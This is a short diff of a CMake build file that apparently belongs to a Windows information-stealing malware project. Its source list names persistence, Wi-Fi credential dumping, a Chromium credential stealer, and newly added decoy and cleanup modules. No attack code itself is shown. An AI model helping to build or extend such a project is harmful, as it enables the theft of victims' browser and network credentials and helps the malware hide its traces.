@@ -46,6 +46,8 @@ add_executable(main WIN32
     src/recon/SysInfo.cpp
     src/recon/InstalledSoftware.cpp
     src/persistence/Persistence.cpp
+    src/decoy/Decoy.cpp
+    src/utils/Cleanup.cpp
     src/wifi/WifiDumper.cpp
     src/utils/Exec.cpp
     src/credential/ChromiumStealer.cpp
@@ -73,7 +75,7 @@ add_executable(main WIN32
 target_include_directories(main PUBLIC external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi ntdll mfplat mf mfuuid evr
 )
 
 # Tests
